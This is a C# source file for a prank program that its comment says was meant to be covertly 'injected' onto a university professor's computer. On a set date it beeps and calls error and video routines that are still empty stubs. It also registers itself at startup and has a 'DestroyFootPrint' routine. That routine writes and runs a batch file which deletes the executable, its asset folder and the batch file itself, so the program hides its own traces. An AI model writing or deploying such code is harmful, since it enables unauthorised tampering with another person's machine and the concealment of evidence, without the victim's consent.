using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using BoneFier.Basic;
using ReflectionClassOverriding;
using BoneFier;

namespace Script
{
    /// <summary>
    /// the Script that I palnned to inject to one our professor in the university for fun.
    /// </summary>
    internal class HappyTrolling : Behavior
    {
        static AppConfig config;

        void Start()
        {

        }
        void Update()
        {
            config = Program.application.ApplicationConfig;

            if (Calendarmanager.CheckActivationDate(config.Activationdate.ToDateTime()))
            {
                if (!config.Enable)
                {
                    Debuger.PrintWarning("The program is disabled.");
                    DestroyFootPrint();
                    return;
                }

                Debuger.Print("Trolls Activated");
                //ترول فعال میشود
                MultipleErros(3);
                PlayVideo("");
                Console.Beep(1500, 2000);
            }

        }

        static void MultipleErros(int count)
        {
        }
        static void PlayVideo(string path)
        {
            //siuuu = https://www.youtube.com/watch?v=em5rwYX8DVY
            //Man yek hackeram = https://www.youtube.com/shorts/1X9uIWQgHR4
        }
        static void DestroyFootPrint() // تابع پاک کردن رد پا
        {
            Debuger.Print("Destroying foot prints.");

            kernel.RemoveStartUp(Program.emigrator.ApplicationName); //حذف کردن برنامه از لیست برنامه های استارت اپ

            //ساخت فایل بت برای حذف فایل ها و برنامه
            /*BATCH code for deleting files:
                 timeout 1
                 del "BoneFierApp.exe"
                 @RD /S /Q "BFasset"    
                 del "FootCleanerBATCH.bat"
             */

            string BATscript = "timeout 1\ndel \"BoneFierApp.exe\"\n@RD /S /Q \"BFasset\"\ndel \"FootprintCleaner.bat\"";

            File.WriteAllText(Program.emigrator.EmigrationPath + @"\FootprintCleaner.bat", BATscript);
            Process.Start(@"FootprintCleaner.bat");

            Application.Exit(); //Good bye world.
        }
    }
}
